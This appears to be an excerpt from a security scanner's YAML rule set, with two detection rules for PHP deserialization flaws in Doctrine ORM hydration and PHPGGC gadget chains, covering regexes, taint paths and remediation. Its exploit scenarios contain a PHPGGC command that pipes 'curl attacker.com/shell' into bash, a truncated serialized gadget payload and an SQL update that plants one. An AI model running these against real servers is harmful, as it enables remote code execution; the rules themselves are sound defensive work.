  # ============================================================================
  # DESER-PHP-007: Doctrine ORM Object Hydration
  # ============================================================================
  - rule_id: "DESER-PHP-007"
    title: "Doctrine ORM Object Hydration with Untrusted Data"
    description: >
      Detects Doctrine ORM object hydration patterns where user-controlled
      data is used to hydrate entity objects without proper validation.
      Doctrine's ObjectHydrator and custom hydration modes can reconstruct
      entity objects from database results or external data. When combined
      with PHP's type juggling and Doctrine's proxy object mechanism,
      attacker-controlled data can lead to unexpected object instantiation,
      lazy-loading proxy exploitation, and in certain configurations,
      deserialization of stored serialized column data. Doctrine entities
      with lifecycle callbacks (PostLoad, PrePersist) can amplify the
      impact of object injection.
    language: php
    category: deserialization
    severity: High
    confidence: 0.82
    cwe: CWE-502
    owasp: "A08:2021-Software-and-Data-Integrity-Failures"
    tags:
      - deserialization
      - php
      - doctrine
      - orm
      - hydration
      - entity
      - object-injection
    detection_layer: 3
    attack_surface_type: "web"
    patterns:
      - type: regex
        pattern: 'getResult\s*\(\s*Query::HYDRATE_OBJECT\s*\).*\$(data|input|user|request)'
        description: "Doctrine query result hydration with user-influenced result"
      - type: regex
        pattern: 'type\s*=\s*["\x27](object|array|json_array)["\x27].*\$_(GET|POST|REQUEST)'
        description: "Doctrine column type with object/array deserialization from user input"
      - type: regex
        pattern: '@ORM\\\\Column\s*\(\s*type\s*=\s*["\x27]object["\x27]'
        description: "Doctrine entity column of type object (uses unserialize)"
      - type: regex
        pattern: '@ORM\\\\Column\s*\(\s*type\s*=\s*["\x27]array["\x27]'
        description: "Doctrine entity column of type array (uses unserialize)"
      - type: regex
        pattern: 'AbstractHydrator|ObjectHydrator|ArrayHydrator'
        description: "Doctrine hydration classes"
      - type: regex
        pattern: 'EntityManager::merge\s*\(\s*unserialize\s*\('
        description: "EntityManager merge with unserialized object"
      - type: regex
        pattern: '@ORM\\\\(PostLoad|PrePersist|PostPersist).*function\s+\w+\s*\('
        description: "Doctrine lifecycle callbacks that may be triggered during hydration"
    anti_patterns:
      - '\/\/\s*test'
      - 'mock.*EntityManager'
      - 'type\s*=\s*["\x27](string|integer|boolean|float|text|datetime)["\x27]'
      - 'Doctrine.*internal'
      - 'Doctrine.*fixture'
      - '@ORM\\\\Column.*type.*json'
      - 'sanitize.*merge'
      - 'validate.*hydrat'
      - 'DTO.*Doctrine'
      - 'Doctrine.*trusted'
      - 'EntityManager.*mock'
      - 'HYDRATE_SCALAR'
    bypass_variants:
      - description: "Doctrine proxy class exploitation through lazy loading"
        pattern: '__Proxy__.*__load|Proxy.*__wakeup'
      - description: "Doctrine type object column with injectable serialized data"
        pattern: "type\\s*=\\s*[\"\\x27]object[\"\\x27].*INSERT.*INTO"
      - description: "Custom Doctrine type with unsafe deserialization"
        pattern: 'convertToPHPValue\s*\([^)]*\)\s*\{[^}]*unserialize'
    evasion_indicators:
      - "Doctrine entity with object/array column types"
      - "Custom Doctrine type using unserialize in convertToPHPValue"
      - "Lifecycle callbacks executing on hydrated objects"
      - "EntityManager.merge with externally sourced entity"
      - "Proxy objects loaded from tampered database records"
    encoding_variants:
      - type: "serialized_column"
        pattern: 'type\s*=\s*["\x27]object["\x27].*O:\d+:'
      - type: "base64_column"
        pattern: 'convertToPHPValue.*base64_decode.*unserialize'
      - type: "json_mixed"
        pattern: 'type\s*=\s*["\x27]json["\x27].*__class'
    multi_function_chain_patterns:
      - "SQL injection -> object column update -> Doctrine hydration -> __wakeup -> RCE"
      - "API input -> entity merge -> lifecycle callback -> side effect"
      - "Database record -> Doctrine hydration -> proxy __load -> lazy loading chain"
      - "Tampered data -> custom type convertToPHPValue -> unserialize -> gadget"
    privilege_context_flags:
      requires_auth_context: false
      admin_only_risk: false
      escalation_vector: "Doctrine object/array column types use PHP unserialize internally. If database content is attacker-influenced, hydration becomes an RCE vector"
    business_logic_indicator:
      financial_impact: true
      data_exposure_risk: true
      compliance_relevant: true
    probable_taint_paths:
      - source: "Database column with serialized data (tampered via SQL injection)"
        sink: "Doctrine ObjectHydrator -> unserialize"
        through: "Query result hydration"
      - source: "API input for entity merge"
        sink: "EntityManager->merge()"
        through: "Direct entity construction from input"
      - source: "Custom Doctrine type conversion"
        sink: "convertToPHPValue -> unserialize"
        through: "Database read"
    impact: |
      Doctrine ORM hydration exploitation can lead to:
      - Object injection through serialized column types (object/array)
      - Remote Code Execution via gadget chains during hydration
      - Data manipulation through lifecycle callback abuse
      - Privilege escalation via proxy class exploitation
      - Indirect SQL injection through type conversion
    remediation: |
      1. Avoid Doctrine object/array column types. Use JSON type instead:
         ```php
         /**
          * @ORM\Column(type="json")
          */
         private array $settings = [];
         ```
      2. Use DTOs instead of directly hydrating entities from user input:
         ```php
         $dto = new UserDTO($request->all());
         $validator->validate($dto);
         $entity = $mapper->toEntity($dto);
         ```
      3. Validate all data before EntityManager.merge().
      4. Implement custom Doctrine types using json_decode instead of unserialize.
      5. Review lifecycle callbacks for security implications.
    references:
      - "https://www.doctrine-project.org/projects/doctrine-orm/en/latest/reference/basic-mapping.html"
      - "https://cwe.mitre.org/data/definitions/502.html"
      - "https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/"
    context_awareness:
      surrounding_context_patterns:
        - "Doctrine entity with object/array column type"
        - "EntityManager.merge with external data"
        - "Custom Doctrine type using unserialize"
        - "Lifecycle callbacks on entity class"
      taint_source_indicators:
        - "API request data"
        - "Database column (if tamperable)"
        - "External entity data for merge"
        - "Import/migration data"
      taint_sink_indicators:
        - "Doctrine hydration"
        - "convertToPHPValue"
        - "EntityManager->merge()"
        - "Lifecycle callback execution"
      sanitization_patterns:
        - "JSON column type instead of object/array"
        - "DTO pattern for input handling"
        - "Input validation before merge"
        - "Custom type using json_decode"
    severity_scoring:
      severity_weight: 7
      risk_score_formula_hint: "severity_weight * confidence * (object_column_present ? 1.3 : 0.7)"
      exploitability_score: "High"
    exploit_scenario:
      attack_example: |
        A Doctrine entity has a preferences column of type "object" which
        uses PHP unserialize internally. An attacker discovers a SQL injection
        in another part of the application and uses it to update the
        preferences column with a serialized PHP gadget chain payload.
        When a legitimate user's profile is loaded, Doctrine hydrates the
        entity and deserializes the preferences column, triggering the
        gadget chain and executing arbitrary code on the server.
      example_payload: "UPDATE users SET preferences = 'O:40:\"Illuminate\\\\Broadcasting\\\\PendingBroadcast\":...' WHERE id = 1"
      attacker_objective: "Inject serialized PHP objects into Doctrine object-type columns to achieve code execution during entity hydration"
    confidence_factors:
      pattern_strength: "high"
      context_match: "high"
      proximity_to_user_input: "high"
      sanitization_absence: "high"
    metadata:
      rule_version: "3.0.0"
      last_reviewed: "2025-01-15"
      rule_maturity_level: "hardened"
      detection_complexity: "contextual"
    cross_rule_intelligence:
      cross_file_risk_flag: true
      requires_ai_validation: true
      high_impact_flag: true
      related_rules:
        - "DESER-PHP-001"
        - "DESER-PHP-005"

  # ============================================================================
  # DESER-PHP-008: PHPGGC Gadget Chain Entry Points
  # ============================================================================
  - rule_id: "DESER-PHP-008"
    title: "PHPGGC Gadget Chain Entry Points in Application Code"
    description: >
      Detects code patterns that serve as entry points for PHP Generic
      Gadget Chains (PHPGGC). This rule identifies classes and methods
      commonly found in popular PHP frameworks and libraries that are
      used as initial links in deserialization gadget chains. The rule
      targets magic methods (__destruct, __wakeup, __toString, __call,
      __get, __set) in classes from Laravel, Symfony, Monolog, Guzzle,
      Doctrine, SwiftMailer, and other widely-used packages that are
      documented in the PHPGGC repository as exploitable gadget chains.
    language: php
    category: deserialization
    severity: High
    confidence: 0.84
    cwe: CWE-502
    owasp: "A08:2021-Software-and-Data-Integrity-Failures"
    tags:
      - deserialization
      - php
      - phpggc
      - gadget-chain
      - magic-methods
      - rce
      - framework
    detection_layer: 3
    attack_surface_type: "web"
    patterns:
      - type: regex
        pattern: 'class\s+\w+[^{]*\{[^}]*function\s+__destruct\s*\(\s*\)\s*\{[^}]*(exec|system|passthru|shell_exec|popen|proc_open|eval|assert|call_user_func|file_put_contents)'
        description: "Class with __destruct method containing dangerous function calls"
      - type: regex
        pattern: 'class\s+\w+[^{]*\{[^}]*function\s+__wakeup\s*\(\s*\)\s*\{[^}]*(exec|system|eval|file_put_contents|include|require)'
        description: "Class with __wakeup containing dangerous function calls"
      - type: regex
        pattern: 'class\s+\w+[^{]*\{[^}]*function\s+__toString\s*\(\s*\)\s*\{[^}]*(file_get_contents|include|require|\$this->\w+->\w+\s*\()'
        description: "Class with __toString enabling chain-through calls"
      - type: regex
        pattern: 'class\s+\w+[^{]*\{[^}]*function\s+__call\s*\([^)]*\)\s*\{[^}]*(call_user_func|call_user_func_array|\$this->\w+\s*\()'
        description: "Class with __call enabling dynamic method invocation"
      - type: regex
        pattern: 'PendingBroadcast|PendingCommand|PendingDispatch'
        description: "Laravel Pending* classes known as PHPGGC gadget entry points"
      - type: regex
        pattern: 'Monolog\\\\Handler\\\\(SyslogUdpHandler|BufferHandler|FingersCrossedHandler|StreamHandler)'
        description: "Monolog handler classes used in PHPGGC chains"
      - type: regex
        pattern: 'GuzzleHttp\\\\Psr7\\\\(FnStream|AppendStream|CachingStream)'
        description: "Guzzle stream classes used in PHPGGC chains"
      - type: regex
        pattern: 'Symfony\\\\Component\\\\(Process\\\\Process|Routing\\\\Loader|Cache\\\\Adapter)'
        description: "Symfony component classes used in PHPGGC chains"
    anti_patterns:
      - '\/\/\s*test'
      - 'mock.*gadget'
      - '@codeCoverageIgnore'
      - '\/\/\s*phpggc.*detection'
      - '__destruct.*log.*close'
      - '__destruct.*unset.*resource'
      - '__destruct.*cleanup'
      - '__wakeup.*reconnect'
      - '__wakeup.*initialize'
      - '__wakeup.*validate'
      - 'final\s+class'
      - '__wakeup.*throw'
      - '__destruct.*debug.*log'
    bypass_variants:
      - description: "Multi-step gadget chain through nested object properties"
        pattern: '\$this->\w+->\w+->\w+\s*\('
      - description: "Dynamic property access chain enabling arbitrary method calls"
        pattern: '\$this->\{\$this->\w+\}\s*\(\s*\$this->\w+'
      - description: "Closure-based gadget leveraging Closure::fromCallable"
        pattern: 'Closure::fromCallable\s*\(\s*\[\s*\$this->\w+\s*,\s*\$this->\w+'
    evasion_indicators:
      - "Magic method with indirect dangerous function calls through property chains"
      - "Closure or callback stored in object property invoked during deserialization"
      - "Multiple framework-specific gadget classes in vendor directory"
      - "Dynamic method dispatch through __call or __callStatic"
      - "Property chains leading to dangerous function invocations"
    encoding_variants:
      - type: "serialized_chain"
        pattern: 'O:\d+:"[A-Z][a-zA-Z\\\\]+":\d+:\{.*s:\d+:"[a-z]";O:\d+'
      - type: "phpggc_output"
        pattern: 'phpggc\s+\w+/\w+\d+'
      - type: "base64_chain"
        pattern: 'base64_decode\s*\(\s*["\x27][A-Za-z0-9+/=]{100,}["\x27]\s*\)'
    multi_function_chain_patterns:
      - "PendingBroadcast.__destruct -> Dispatcher.dispatch -> call_user_func -> system()"
      - "BufferHandler.__destruct -> StreamHandler.write -> file_put_contents -> webshell"
      - "FnStream.__destruct -> close() -> call_user_func -> exec()"
      - "Process.__destruct -> stop -> terminate -> proc_terminate"
    privilege_context_flags:
      requires_auth_context: false
      admin_only_risk: false
      escalation_vector: "PHPGGC gadget chains convert PHP object injection into RCE, file write, SSRF, or SQL injection through framework magic method chains"
    business_logic_indicator:
      financial_impact: true
      data_exposure_risk: true
      compliance_relevant: true
    probable_taint_paths:
      - source: "unserialize() or phar:// with user-controlled data"
        sink: "Gadget chain entry point (__destruct/__wakeup/__toString)"
        through: "PHP object instantiation during deserialization"
      - source: "Crafted serialized string"
        sink: "Framework magic method"
        through: "Autoloader-enabled class instantiation"
      - source: "Cookie/session deserialization"
        sink: "Gadget chain terminal (system/exec/file_put_contents)"
        through: "Multi-hop property chain through framework classes"
    impact: |
      PHPGGC gadget chain exploitation leads to:
      - Remote Code Execution through system()/exec()/eval()
      - Arbitrary file write for webshell deployment
      - Arbitrary file read for sensitive data extraction
      - Server-Side Request Forgery through HTTP client gadgets
      - SQL injection through ORM gadget chains
      - Complete server compromise through chained operations
    remediation: |
      1. Prevent deserialization of untrusted data (root cause):
         ```php
         // Use json_decode instead of unserialize
         $data = json_decode($input, true);
         ```
      2. Use allowed_classes to prevent gadget chain class instantiation:
         ```php
         $data = unserialize($input, ['allowed_classes' => false]);
         ```
      3. Remove unused framework packages to reduce gadget surface:
         ```bash
         composer remove unused/package
         composer install --no-dev
         ```
      4. Audit magic methods in application code:
         ```bash
         grep -rn '__destruct\|__wakeup\|__toString\|__call' src/
         ```
      5. Implement runtime deserialization monitoring (e.g., Snuffleupagus).
    references:
      - "https://github.com/ambionics/phpggc"
      - "https://cwe.mitre.org/data/definitions/502.html"
      - "https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/"
      - "https://www.ambionics.io/blog/php-generic-gadget-chains"
    context_awareness:
      surrounding_context_patterns:
        - "Magic method definitions in framework classes"
        - "Object property chain leading to dangerous function"
        - "Known PHPGGC gadget chain classes in vendor"
        - "unserialize or phar deserialization in application"
      taint_source_indicators:
        - "unserialize() call"
        - "phar:// metadata deserialization"
        - "session_decode()"
        - "Any PHP deserialization entry point"
      taint_sink_indicators:
        - "system()"
        - "exec()"
        - "eval()"
        - "file_put_contents()"
        - "call_user_func()"
        - "proc_open()"
      sanitization_patterns:
        - "allowed_classes => false"
        - "No unserialize of user data"
        - "Vendor audit for gadget classes"
        - "Snuffleupagus PHP extension"
    severity_scoring:
      severity_weight: 8
      risk_score_formula_hint: "severity_weight * confidence * (unserialize_present ? 1.5 : 0.5)"
      exploitability_score: "High"
    exploit_scenario:
      attack_example: |
        A PHP application has an unserialize vulnerability and uses Laravel 8
        with Monolog. The attacker generates a PHPGGC chain:
        phpggc Laravel/RCE2 system 'curl attacker.com/shell|bash' -s
        This produces a serialized string starting with
        O:40:"Illuminate\Broadcasting\PendingBroadcast":2:{...}
        that chains: PendingBroadcast.__destruct -> Dispatcher.dispatch
        -> call_user_func -> system('curl attacker.com/shell|bash').
        The attacker sends this as a cookie value to the vulnerable
        endpoint, achieving remote code execution.
      example_payload: 'O:40:"Illuminate\\Broadcasting\\PendingBroadcast":2:{s:9:"\\0*\\0events";O:28:"Illuminate\\Events\\Dispatcher":1:{...}}'
      attacker_objective: "Leverage PHPGGC gadget chains in framework libraries to convert PHP object injection into remote code execution"
    confidence_factors:
      pattern_strength: "high"
      context_match: "high"
      proximity_to_user_input: "high"
      sanitization_absence: "high"
    metadata:
      rule_version: "3.0.0"
      last_reviewed: "2025-01-15"
      rule_maturity_level: "hardened"
      detection_complexity: "contextual"
    cross_rule_intelligence:
      cross_file_risk_flag: true
      requires_ai_validation: true
      high_impact_flag: true
      related_rules:
        - "DESER-PHP-001"
        - "DESER-PHP-002"
        - "DESER-PHP-005"
        - "DESER-PHP-006"
